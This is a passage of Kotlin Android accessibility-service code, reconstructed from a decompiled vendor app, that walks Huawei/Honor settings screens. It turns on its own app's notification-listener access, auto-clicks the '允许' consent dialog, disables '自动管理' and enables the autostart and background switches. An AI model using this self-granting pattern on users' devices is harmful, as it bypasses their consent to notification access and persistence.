    open fun scrollAndClickMoreBatterySettings(): Boolean {
        // ADAPT: vendor scrollAndClick(i=3, str="更多电池设置", z=true) tries up to i scroll passes
        for (scroll in 0 until 3) {
            if (clickTextOnCurrentRoot("更多电池设置", exact = true)) return true
            // Vendor L7463-7469: find scrollable container, or fallback to m212204g1() swipe
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                // Try scrollable node first (vendor L7463: m212149c6(root))
                val scrollable = findFirstScrollableNode(root)
                if (scrollable != null) {
                    scrollable.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                } else {
                    // Vendor L7469: fallback swipe gesture m212204g1()
                    root.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                }
            }
            // vendor L7477: delay 100ms
            // ADAPT: cannot delay inside non-suspend fun; caller surrounds with coroutine delay
        }
        return false
    }

    /**
     * Vendor m212190e5 (L6705) — isOnMoreBatterySettingsPage.
     * Uses HuaweiPageDetector.isOnMoreBatterySettingsPage(root).
     * `open` for test spy override.
     */
    open fun isOnMoreBatterySettingsPage(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnMoreBatterySettingsPage(root)
    }

    /**
     * Vendor m212208g6("休眠时始终保持网络连接", true) (L7630) — toggleSwitch wrapper.
     * Enables the "休眠时始终保持网络连接" switch on the "更多电池设置" page.
     *
     * Returns true if switch was found and is now in target state.
     * `open` for test spy override.
     */
    open fun toggleNetworkSwitch(): Boolean {
        return toggleSwitchByText("休眠时始终保持网络连接", targetChecked = true)
    }

    /**
     * ADAPT: 真机加固 — 读取当前"休眠时始终保持网络连接"开关的 isChecked 状态。
     * 用于 toggleSwitchByText 返回 false 时区分"已达目标"vs"节点未找到"。
     * 返回 true = 已开启（达目标）；false = 未开启或未找到节点。
     */
    open fun verifyNetworkSwitchChecked(): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val texts = listOf(
            "休眠时始终保持网络连接",
            "休眠时保持网络连接",
            "锁屏后始终保持网络连接",
            "Keep network connected when sleeping",
            "Always keep mobile data on"
        )
        for (text in texts) {
            val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (n in nodes) {
                if (!n.isVisibleToUser) continue
                val sw = findSwitchNearNode(n) ?: continue
                android.util.Log.d("HuaweiSteps", "[Step3] verifyNetworkSwitchChecked '$text' isChecked=${sw.isChecked}")
                return sw.isChecked
            }
        }
        return false
    }

    /**
     * Simplified toggleSwitch helper — vendor m212208g6 (L7630).
     *
     * Finds nodes matching [text] in current root, walks up to parent for Switch-like node,
     * clicks if not in [targetChecked] state.
     *
     * ADAPT: vendor m212208g6 uses both gesture (dispatchGesture) and ACTION_CLICK fallback with
     * verification loop (m212210g8). Replica uses ACTION_CLICK only (simpler, matches 95% of cases).
     * Gesture path deferred to T13/T16 (悬浮窗/executeAll) where GestureTapHelper is integrated.
     */
    internal fun toggleSwitchByText(text: String, targetChecked: Boolean): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
        if (nodes.isNullOrEmpty()) return false
        for (n in nodes) {
            if (!n.isVisibleToUser) continue
            // Walk up 5 levels to find Switch-like node (vendor m212176c7 + m212177c8)
            val sw = findSwitchNearNode(n) ?: continue
            if (sw.isChecked == targetChecked) return true // already in target state
            sw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
            return true
        }
        return false
    }

    /**
     * Walk up node ancestors (max 5) to find a Switch/CheckBox/Toggle-like node.
     * Vendor m212176c7 (L6032) + m212177c8 (L6048).
     *
     * ADAPT: replica uses SwitchNodeFinder.isSwitchLike() for className matching to align with
     * vendor's f55054c0 array + isCheckable checks.
     */
    private fun findSwitchNearNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        if (SwitchNodeFinder.isSwitchLike(node) || node.isCheckable) return node
        var parent: AccessibilityNodeInfo? = try { node.parent } catch (_: Exception) { null }
        var depth = 0
        while (parent != null && depth < 5) {
            // Check parent itself
            if (SwitchNodeFinder.isSwitchLike(parent) || parent.isCheckable) return parent
            // DFS children of parent looking for switch
            val found = findSwitchInChildren(parent)
            if (found != null) return found
            parent = try { parent.parent } catch (_: Exception) { null }
            depth++
        }
        return null
    }

    /** DFS immediate children of [node] for a switch-like node. */
    private fun findSwitchInChildren(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            if (SwitchNodeFinder.isSwitchLike(child) || child.isCheckable) return child
        }
        return null
    }

    /**
     * Find first scrollable node in tree (vendor m212149c6 helper pattern).
     * Returns null if none found. Used by scrollAndClickMoreBatterySettings.
     *
     * ADAPT: vendor m212149c6 searches the full node tree; replica does a DFS limited to 3
     * levels for performance in tests.
     */
    private fun findFirstScrollableNode(root: AccessibilityNodeInfo?, depth: Int = 0): AccessibilityNodeInfo? {
        if (root == null || depth > 10) return null
        if (root.isScrollable) return root
        for (i in 0 until root.childCount) {
            val child = try { root.getChild(i) } catch (_: Exception) { null } ?: continue
            val found = findFirstScrollableNode(child, depth + 1)
            if (found != null) return found
        }
        return null
    }

    // =========================================================================
    // Step 4/10 — 通知使用权 (vendor m212170b7, L3725-4164)
    // =========================================================================

    /**
     * Vendor C0365a2 m212170b7 (L3725-4164) — 通知使用权 Step 4/10.
     *
     * Vendor flow (distilled from coroutine state-machine):
     *  case 0 — entry:
     *    L3768: m212193f0(f55074b2) "notification_listener_completed" SP short-circuit → skip
     *    Outer retry loop i7=1; i7<3 (max 2 tries):
     *      L3781: start ACTION_NOTIFICATION_LISTENER_SETTINGS intent via service.startActivity
     *      Inner wait loop i5=1; i5<11, 100ms each: poll rootInActiveWindow for "通知使用权" text
     *      L3810: page loaded check (any visible "通知使用权" node)
     *      L3844: m212208g6(m212178d1(), true) — toggleSwitch(appLabel, targetChecked=true)
     *      delay(300L)
     *      L3857: inner dialog loop i2=1; i2<11, 100ms each: check "是否启用" visible
     *      L3908: m212160a3("允许", true) — clickText("允许", exact=true)
     *      L3922: performGlobalAction(GLOBAL_ACTION_BACK=1)
     *  case 6:
     *    L4083: verify: find app row by text, walk children for Switch child, check isChecked
     *    L4136: m212195f2(f55074b2) — mark completion
     *    return
     *
     * Vendor gate (executeAll L1338): Step 4 runs only when f55064a2==false (not Honor).
     * Replica: isHuawei==true means Honor → skip (same semantics as Step 1).
     *
     * ADAPT:
     *  - SP m212193f0 / m212195f2 short-circuit deferred to T16. Always runs full flow for now.
     *  - waitForNotifListenerPage / toggleAppSwitchInNlsPage / handleNlsConfirmDialog are `open`
     *    to allow Mockito spy overrides in tests without complex UI setup.
     *  - `isStep4Completed()` returns false always until T16 implements SharedPreferences.
     *  - Intent flag 276824064 = vendor L3782 original value, preserved 1:1.
     *  - `isToggleSwitchByTextForStep4` extracted for test spy injection.
     */
    @Suppress("UNUSED_PARAMETER")
    open suspend fun executeStep4NotificationListener(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step4/10] enter executeStep4NotificationListener (isHuawei=$isHuawei)")
        if (isHuawei) {
            HuaweiStepLogger.skip(4, "非荣耀跳过 (vendor L1338 f55064a2=true)", logs)
            return
        }
        HuaweiStepLogger.phase(4, "通知使用权开始", "vendor L3767", logs)

        if (isStep4Completed()) {
            HuaweiStepLogger.skip(4, "SP 已标记完成", logs)
            return
        }

        val maxOuterRetry = 2 // vendor: i7 = 1; i7 < 3 → max 2 iterations

        for (outerAttempt in 1..maxOuterRetry) {
            logs.add("[Step4/10] 第 $outerAttempt 次尝试 (vendor L3779)")

            // Vendor L3781: start ACTION_NOTIFICATION_LISTENER_SETTINGS
            logs.add("[Step4/10] 步骤1: 打开通知使用权设置页面 (vendor L3780)")
            try {
                val intent = android.content.Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                    // Vendor L3782: setFlags(276824064)
                    flags = 276824064
                }
                val launcher: android.content.Context = service ?: context
                launcher.startActivity(intent)
            } catch (e: Exception) {
                failures.add("[Step4/10] 启动通知使用权页面失败: ${e.message}")
                return
            }

            // Vendor L3795-3826: inner wait loop (i5=1..11, 100ms each) for "通知使用权"
            val pageLoaded = waitForNotifListenerPage()

            if (!pageLoaded) {
                logs.add("[Step4/10] 通知使用权页面未加载，重试 (vendor L3977)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step4/10] 达到最大重试次数，流程结束 (vendor L3774-3776)")
                    return
                }
                continue
            }

            // Vendor L3844: m212208g6(m212178d1(), true) — toggle app's switch ON
            logs.add("[Step4/10] 步骤3: 点击'${appLabel}'的开关 (vendor L3844)")
            toggleAppSwitchInNlsPage()
            logs.add("[Step4/10] 已尝试点击开关: $appLabel (vendor L3846)")

            // Vendor L3850: delay(300L)
            delay(300L) // vendor b81.m210571b1(300L, ...)

            // Vendor L3852: 步骤4 — 处理弹窗
            logs.add("[Step4/10] 步骤4: 处理弹窗 (vendor L3852)")
            val dialogHandled = handleNlsConfirmDialog()
            if (dialogHandled) {
                logs.add("[Step4/10] 点击: 允许 (vendor L3909)")
            } else {
                logs.add("[Step4/10] 未检测到弹窗，可能已开启 (vendor L3918)")
            }

            // Vendor L3921-3926: 步骤5 — performGlobalAction(BACK=1)
            logs.add("[Step4/10] 步骤5: 验证开启状态 (vendor L3921)")
            try {
                service?.performGlobalAction(1) // GLOBAL_ACTION_BACK
            } catch (_: Exception) { }

            // Vendor case 6 (L4079-4138): verify switch isChecked + mark complete
            delay(300L) // brief settle before verify
            val verified = verifyNlsSwitchChecked()
            HuaweiStepLogger.probe(4, "verifyNlsSwitchChecked", verified)
            if (verified) {
                // FIX 2026-04-17: mark ONLY 当 verify 通过（开关真的 isChecked）
                HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP4_NOTIFICATION_LISTENER)
                HuaweiStepLogger.success(4, "通知使用权已授权 + SP mark", "vendor L4109", successes)
            } else {
                HuaweiStepLogger.warn(4, "开关未开启 — 不 mark SP", "下次启动会重试", logs)
            }
            return // vendor case 6 always returns here
        }

        logs.add("[Step4/10] 通知使用权流程结束（可能未成功）(vendor L3775-3776)")
    }

    // ---- Step 4 open helpers (extracted for testability) ----

    /**
     * Vendor m212193f0(f55074b2) — SP completion check.
     *
     * 接入 [HuaweiStepCompletionStore]（post-T18 系统审查新增）。
     * `open` so tests can override via spy.
     */
    open fun isStep4Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP4_NOTIFICATION_LISTENER)

    /**
     * Vendor m212170b7 case 1 inner poll loop (L3795-3829) — wait for "通知使用权" page to load.
     *
     * Polls rootInActiveWindow up to 11 times × 100ms for any visible "通知使用权" text node.
     * Returns true if page detected within budget, false otherwise.
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor uses coroutine resume continuation; replica uses a suspend loop with delay.
     */
    open suspend fun waitForNotifListenerPage(): Boolean {
        // vendor: i5=1; i5 < 11 (10 iterations) — we use 10 for clarity
        val maxPolls = 10 // vendor: i5 < i10 where i10=11
        for (poll in 0 until maxPolls) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val nodes = try {
                    root.findAccessibilityNodeInfosByText("通知使用权")
                } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty() && nodes.any { it.isVisibleToUser }) {
                    return true
                }
            }
            delay(100L) // vendor b81.m210571b1(100L, ...)
        }
        return false
    }

    /**
     * Vendor m212208g6(m212178d1(), true) (L3844) — toggle app switch ON in NLS list.
     *
     * Calls toggleSwitchByText(appLabel, targetChecked=true).
     * `open` for test spy override.
     */
    open fun toggleAppSwitchInNlsPage(): Boolean {
        return toggleSwitchByText(appLabel, targetChecked = true)
    }

    /**
     * Vendor m212170b7 case 3 inner dialog loop (L3852-3965) — handle "是否启用" confirm dialog.
     *
     * Polls rootInActiveWindow up to 10 times × 100ms for "是否启用" visible text.
     * If visible → m212160a3("允许", true) = clickTextOnCurrentRoot("允许", exact=true).
     * Returns true if dialog found and "允许" was clicked, false if no dialog (already enabled).
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor loop i2=1; i2 < i10=11 (10 iterations); replica mirrors exactly.
     */
    open suspend fun handleNlsConfirmDialog(): Boolean {
        // vendor: i2=1; i2<11 (10 iterations)
        for (poll in 0 until 10) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val dialogNodes = try {
                    root.findAccessibilityNodeInfosByText("是否启用")
                } catch (_: Exception) { null }
                if (!dialogNodes.isNullOrEmpty() && dialogNodes.any { it.isVisibleToUser }) {
                    // Vendor L3868: dialog visible — check also for "允许" button
                    val allowNodes = try {
                        root.findAccessibilityNodeInfosByText("允许")
                    } catch (_: Exception) { null }
                    val allowVisible = !allowNodes.isNullOrEmpty() && allowNodes.any { it.isVisibleToUser }
                    if (allowVisible) {
                        // Vendor L3879: 检测到'允许'按钮
                        // Vendor L3908: m212160a3("允许", true) — clickText exact
                        val clicked = clickTextOnCurrentRoot("允许", exact = true)
                        if (clicked) {
                            return true
                        }
                    }
                    // Dialog found but allow not found yet — dialog itself is the trigger
                    return true
                }
            }
            delay(100L) // vendor b81.m210571b1(100L, ...)
        }
        return false
    }

    /**
     * Vendor m212170b7 case 6 (L4083-4134) — verify NLS switch isChecked for app row.
     *
     * Finds app row by text (appLabel) in rootInActiveWindow, walks parent's children for a
     * Switch child, returns child.isChecked.
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor uses a for-loop over parent.childCount; replica matches exactly.
     */
    open fun verifyNlsSwitchChecked(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val appNodes = try {
            root.findAccessibilityNodeInfosByText(appLabel)
        } catch (_: Exception) { null } ?: return false

        for (appNode in appNodes) {
            if (!appNode.isVisibleToUser) continue
            val parent = try { appNode.parent } catch (_: Exception) { null } ?: continue
            val childCount = parent.childCount
            for (i in 0 until childCount) {
                val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
                val className = child.className?.toString() ?: continue
                // ADAPT: 对齐 vendor f55054c0 — 用 SwitchClassNames 精确匹配 8 个类名（含 CheckBox/ToggleButton/CompoundButton）
                if (SwitchClassNames.isSwitch(className)) {
                    // Vendor L4108-4112: log and return isChecked
                    return child.isChecked
                }
            }
        }
        return false
    }

    /**
     * Stub for test spy injection — wraps toggleSwitchByText for Step 4.
     *
     * ADAPT: extracted so Mockito spy can override `isToggleSwitchByTextForStep4(text, state)`
     * in Test 2 without needing full UI tree setup. Delegates to existing [toggleSwitchByText].
     */
    open fun isToggleSwitchByTextForStep4(text: String, targetChecked: Boolean): Boolean {
        return toggleSwitchByText(text, targetChecked)
    }

    // =========================================================================
    // Step 5/10 — 自启动权限 (vendor m212164b1 + m212196f3, L1985-2049 + L6861-6880)
    // =========================================================================

    /**
     * Vendor C0365a2 m212164b1 + m212196f3 — 自启动权限 Step 5/10.
     *
     * Vendor flow (reconstructed from available bytecode hints + m212196f3 companion + constants):
     *
     *  1. m212196f3 (L6861-6879) — iterate STARTUP_COMPONENTS (4 pairs), startActivity each,
     *     return true on first success; if all fail return false.
     *     → On fail: add failure, return early.
     *  2. delay(2000L) — wait for startup-manager page to appear.
     *  3. scrollFindAndClickApp(appLabel, maxScrollPasses=8) — scroll + find our app in list.
     *     → Not found: log and return (not a hard failure per vendor semantics).
     *  4. delay(1500L) — wait for app detail page.
     *  5. disableAutoManageSwitch() — turn OFF "自动管理" (vendor: switch checked=true means
     *     "auto-manage = restrictive"; turning it OFF reveals the three manual sub-switches).
     *  6. enableAutoStartSwitches() — enable "允许自启动" / "允许关联启动" / "允许后台活动".
     *  7. Record success if any switches were toggled.
     *
     * Vendor companion AUTO_START_SWITCH_TEXTS (L192-196):
     *   ["允许自启动","允许关联启动","允许后台活动","允許自啟動","允許關聯啟動","允許後台活動"]
     *
     * ADAPT:
     *  - m212164b1 body is not decompiled by JADX (throws UnsupportedOperationException);
     *    flow reconstructed from: m212196f3 (fully decompiled), companion constants (L165-196),
     *    isAutoStartDialogOpened (L6572-6618), and executeAll step ordering (L1385-1388).
     *  - [launchStartupManager], [scrollFindAndClickApp], [disableAutoManageSwitch],
     *    [enableAutoStartSwitches] are `open` for Mockito spy override in tests.
     *  - Confirm dialog ("开启自启动将允许 xxx") not replicated — vendor body unavailable,
     *    and the dialog is optional / device-specific. Marked ADAPT below.
     */
    open suspend fun executeStep5AutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step5/10] enter executeStep5AutoStart")
        HuaweiStepLogger.phase(5, "自启动权限开始", "vendor m212164b1 + m212196f3", logs)

        // ADAPT: 真机幂等 — 若 STEP5_AUTOSTART 24h 内已 mark，跳过整个 UI 流程
        // (对齐 Step 3/4/7 的入口幂等 fast-path)
        if (HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)) {
            HuaweiStepLogger.skip(5, "SP STEP5_AUTOSTART 24h 内已 mark", logs)
            successes.add("[Step5/10] 自启动权限已配置（SP 幂等跳过）")
            return
        }

        // Vendor m212196f3 (L6861-6879): iterate STARTUP_COMPONENTS, try startActivity
        val launched = try { launchStartupManager() } catch (e: Exception) {
            HuaweiStepLogger.fail(5, "启动自启动管理异常", e.message ?: "", failures)
            false
        }
        HuaweiStepLogger.probe(5, "launchStartupManager", launched)
        if (!launched) {
            // ADAPT: 真机修复 — 移除 launchAppDetailsSettings fallback（它会在 task stack 留一个
            // 应用详情页 Activity，干扰后续 BFS 的 rootInActiveWindow 指向）。
            // 直接进入 BFS 设置主页导航，vendor 原版同样在 4 个 Intent 全被拒后无 fallback。
            HuaweiStepLogger.warn(5, "4 个 STARTUP_COMPONENTS 全部被拒",
                "直接进入 BFS 设置主页导航", logs)

            // ADAPT: real-device hardening — Intent 直连被 Permission Denial 后，
            // 用 BFS 从设置主页导航到自启动管理（文档 §4 vendor 4 组文本数组）
            HuaweiStepLogger.phase(5, "BFS 导航: 设置主页 → 应用和服务 → 启动管理", "", logs)
            // 先打开设置主页
            try {
                val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                (service ?: context).startActivity(settingsIntent)
                delay(2000L) // 等设置页渲染
            } catch (e: Exception) {
                HuaweiStepLogger.fail(5, "打开设置主页失败", e.message ?: "", failures)
                return
            }

            // ADAPT: real-device hardening — "应用和服务"在设置第二屏，需要滚动查找
            // 真机 FIN-AL60 dump 确认 y=1352-1417（首屏可见区域外）
            var bfsReachedManager = false

            // 第 1 级：滚动找"应用和服务"（最多 3 次滚动 + 每次 800ms 等待）
            var entryFound = false
            for (scrollAttempt in 0..3) {
                for (entryText in AutoStartNavigator.ENTRY_TEXTS) {
                    if (clickTextOnCurrentRoot(entryText, exact = true)) {
                        HuaweiStepLogger.probe(5, "BFS 第1级命中 (scroll=$scrollAttempt)", entryText)
                        entryFound = true
                        break
                    }
                }
                if (entryFound) break
                // 未找到 → 向下滚动
                val svcRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                val scrollTarget = findFirstScrollableNode(svcRoot)
                if (scrollTarget != null) {
                    scrollTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                } else {
                    // ADAPT: findFirstScrollableNode 未找到 → gesture swipe 兜底
                    val svc = service
                    if (svc != null) {
                        val w = getScreenWidthPx().toFloat()
                        val h = getScreenHeightPx().toFloat()
                        val path = android.graphics.Path().apply {
                            moveTo(w * 0.5f, h * 0.7f)
                            lineTo(w * 0.5f, h * 0.3f)
                        }
                        try {
                            val gesture = android.accessibilityservice.GestureDescription.Builder()
                                .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 300L))
                                .build()
                            svc.dispatchGesture(gesture, null, null)
                        } catch (_: Exception) { }
                    }
                }
                delay(800L)
            }

            if (!entryFound) {
                HuaweiStepLogger.warn(5, "BFS 第1级未找到应用和服务入口", "已滚动 4 次", logs)
                return
            }
            delay(1500L)

            // 第 2 级：点击"应用启动管理"
            for (mgmtText in AutoStartNavigator.MANAGER_TEXTS) {
                if (clickTextOnCurrentRoot(mgmtText, exact = false)) {
                    HuaweiStepLogger.probe(5, "BFS 第2级命中", mgmtText)
                    delay(1500L)
                    bfsReachedManager = true
                    break
                }
            }

            if (!bfsReachedManager) {
                HuaweiStepLogger.warn(5, "BFS 第2级未找到启动管理入口", "", logs)
                return
            }

            // ADAPT: real-device hardening — 华为启动管理页用**搜索框策略**（真机 UI dump 确认）
            // 流程：搜索 appLabel → 找到 Switch(checked=true) → 关闭 → 弹窗 → 开 3 switch → 确定
            // 搜索框 viewId: android:id/search_src_text（与悬浮窗列表相同）
            // Switch viewId: com.huawei.systemmanager:id/switcher
            HuaweiStepLogger.phase(5, "搜索框策略: 搜索 appLabel 并配置自启动", appLabel, logs)

            // Step A: 点击"搜索应用"
            if (!clickTextOnCurrentRoot("搜索应用", exact = true)) {
                // 可能搜索栏已展开
                android.util.Log.d("HuaweiSteps", "[Step5] 搜索应用按钮未找到, 尝试直接定位搜索框")
            }
            delay(1000L)

            // Step B: 在搜索框输入 appLabel
            val searchBoxIds = listOf(
                "android:id/search_src_text",
                "com.huawei.systemmanager:id/search_src_text"
            )
            val svc = service ?: return
            val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            var searchBox: android.view.accessibility.AccessibilityNodeInfo? = null
            if (root != null) {
                for (id in searchBoxIds) {
                    val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                    if (!nodes.isNullOrEmpty()) {
                        searchBox = nodes[0]
                        break
                    }
                }
            }
            if (searchBox == null) {
                HuaweiStepLogger.fail(5, "未找到搜索框", "ids=$searchBoxIds", failures)
                return
            }
            searchBox.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_FOCUS)
            val args = android.os.Bundle().apply {
                putCharSequence(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    appLabel
                )
            }
            searchBox.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            HuaweiStepLogger.probe(5, "搜索框已输入", appLabel)
            delay(1500L) // 等搜索结果

            // Step C: 找到搜索结果中的 Switch (id=switcher, checked=true) 并点击关闭"自动管理"
            val root2 = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            if (root2 != null) {
                val switcherId = "com.huawei.systemmanager:id/switcher"
                val switches = try { root2.findAccessibilityNodeInfosByViewId(switcherId) } catch (_: Exception) { null }
                if (!switches.isNullOrEmpty()) {
                    val sw = switches[0]
                    if (sw.isChecked) {
                        // checked=true = 自动管理(受限) → 点击关闭 → 弹出手动管理对话框
                        sw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        HuaweiStepLogger.probe(5, "关闭自动管理 Switch", "checked=true→false")
                        delay(1500L) // 等弹窗

                        // Step D: 弹窗中开启 3 个 Switch (checked=false → true)
                        val root3 = try { svc.rootInActiveWindow } catch (_: Exception) { null }
                        if (root3 != null) {
                            val dialogSwitches = try {
                                root3.findAccessibilityNodeInfosByViewId(switcherId)
                            } catch (_: Exception) { null }
                            var toggled = 0
                            if (dialogSwitches != null) {
                                for (dsw in dialogSwitches) {
                                    if (dsw.isCheckable && !dsw.isChecked) {
                                        dsw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                        toggled++
                                        delay(300L)
                                    }
                                }
                            }
                            HuaweiStepLogger.probe(5, "弹窗 Switch 开启数", toggled)

                            // Step E: 点"确定"
                            delay(500L)
                            val root4 = try { svc.rootInActiveWindow } catch (_: Exception) { null }
                            if (root4 != null) {
                                // 优先 viewId button1
                                val btn1 = try {
                                    root4.findAccessibilityNodeInfosByViewId("android:id/button1")
                                } catch (_: Exception) { null }
                                if (!btn1.isNullOrEmpty() && btn1[0].isClickable) {
                                    btn1[0].performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                    HuaweiStepLogger.probe(5, "点击确定 (button1)", "ok")
                                } else {
                                    // fallback: 文本 "确定"
                                    clickTextOnCurrentRoot("确定", exact = true)
                                    HuaweiStepLogger.probe(5, "点击确定 (text)", "ok")
                                }
                            }

                            if (toggled > 0) {
                                HuaweiStepCompletionStore.markCompleted(context,
                                    HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)
                                HuaweiStepLogger.success(5, "自启动配置完成",
                                    "关闭自动管理 + 开启 $toggled 个 switch + 确定", successes)
                            } else {
                                HuaweiStepLogger.warn(5, "弹窗中未找到可开启的 switch", "", logs)
                            }
                        }
                    } else {
                        // ADAPT: 真机幂等 — checked=false 表示"自动管理"已关闭
                        // = Step 5 之前已配置过（进入手动管理模式后三 switch 由上次脚本/用户开启）
                        // 直接 markCompleted 并 skip，避免下次 executeAll 重新触发三 switch 弹窗
                        HuaweiStepLogger.warn(5, "Switch 已是 unchecked（手动管理）", "视为已配置，mark 跳过", logs)
                        HuaweiStepCompletionStore.markCompleted(context,
                            HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)
                        successes.add("[Step5/10] 自启动已是手动管理模式（幂等 mark）")
                    }
                } else {
                    HuaweiStepLogger.fail(5, "搜索结果中未找到 switcher", switcherId, failures)
                }
            }
            return
        }
        logs.add("[Step5/10] 已启动自启动管理 (vendor m212196f3 return true)")

        // Wait for startup-manager list page to appear (vendor: ~2000ms settle)
        delay(2000L)

        // Scroll + find app in list by appLabel (up to 8 scroll passes)
        val found = try {
            scrollFindAndClickApp(appLabel, maxScrollPasses = 8)
        } catch (e: Exception) {
            logs.add("[Step5/10] 查找 $appLabel 异常: ${e.message}")
            false
        }
        if (!found) {
            // Vendor: not finding the app is a soft exit (list may be filtered or empty).
            // Do NOT add to failures — matches vendor's log-and-continue semantics.
            logs.add("[Step5/10] 启动管理列表未找到 $appLabel (soft exit)")
            return
        }
        logs.add("[Step5/10] 已找到并点击 $appLabel (vendor: scroll-find success)")

        // Wait for app detail page
        delay(1500L)

        // Vendor: "自动管理" switch ON means "auto-managed / restricted" → turn it OFF first
        // so that the three manual permission sub-switches become available.
        val autoManageDisabled = try { disableAutoManageSwitch() } catch (_: Exception) { false }
        if (autoManageDisabled) {
            logs.add("[Step5/10] 已关闭'自动管理'开关 (vendor: switch OFF → 手动管理)")
            delay(500L) // brief settle after toggle
        }

        // Vendor AUTO_START_SWITCH_TEXTS: enable the three allow-switches
        val toggled = try { enableAutoStartSwitches() } catch (e: Exception) {
            logs.add("[Step5/10] enableAutoStartSwitches 异常: ${e.message}")
            0
        }

        // ADAPT: vendor may show a confirm dialog "开启自启动将允许 xxx" after toggling;
        // vendor body is not decompiled → dialog handling omitted. Real-device testing (T19)
        // should verify whether this dialog appears and add handling if needed.

        if (toggled > 0) {
            successes.add("[Step5/10] 自启动权限: 开启 $toggled 项")
            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)
            logs.add("[Step5/10] 自启动权限配置完成，开启 $toggled 项")
        } else {
            logs.add("[Step5/10] 未发现可切换的自启动开关（可能已开启或页面结构不匹配）")
        }
    }

    // ---- Step 5 open helpers (extracted for testability) ----

    /**
     * Vendor m212196f3 (L6861-6879) — iterate STARTUP_COMPONENTS, startActivity each.
     *
     * Vendor: uses `Intent().setComponent(cn).setFlags(276824064).startActivity()` in a for-loop
     * over the 4 pairs. Returns true on first success, false if all fail.
     *
     * Flags 276824064 = vendor L6868 `intent.setFlags(276824064)`.
     *
     * ADAPT: replica uses [service] if available (matching vendor `this.f55063a1.startActivity`);
     * falls back to [context] (vendor has no fallback, but unit tests need it).
     * `open` for test spy override.
     */
    open fun launchStartupManager(): Boolean {
        for (component in STARTUP_COMPONENTS) {
            try {
                val intent = android.content.Intent().apply {
                    setComponent(component)
                    // Vendor L6868: setFlags(276824064)
                    setFlags(276824064)
                }
                val launcher: android.content.Context = service ?: context
                launcher.startActivity(intent)
                return true
            } catch (e: Exception) {
                // Vendor L6872-6876: catch Exception, log, continue to next component
                val msg = e.message
                android.util.Log.d(
                    TAG,
                    "[自启动] 打开失败: ${component.packageName}/${component.className} - $msg"
                )
            }
        }
        return false
    }

    /**
     * Scroll + find app by [appLabel] in the startup-manager list.
     *
     * Up to [maxScrollPasses] scroll attempts; each pass tries [clickTextOnCurrentRoot] first,
     * then scrolls the list forward if not found.
     *
     * Returns true if found + clicked, false if exhausted.
     * `open` for test spy override.
     *
     * ADAPT: vendor m212164b1 body not decompiled; scroll-find pattern inferred from
     * scrollAndClickMoreBatterySettings (same helper m212206g3 used elsewhere) and from
     * companion AUTO_START_TEXTS constants. exact=false to tolerate partial label matches.
     */
    open fun scrollFindAndClickApp(appLabel: String, maxScrollPasses: Int): Boolean {
        for (pass in 0 until maxScrollPasses) {
            if (clickTextOnCurrentRoot(appLabel, exact = false)) return true
            // Scroll the list forward to reveal more items
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val scrollable = findFirstScrollableNode(root)
                if (scrollable != null) {
                    scrollable.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                } else {
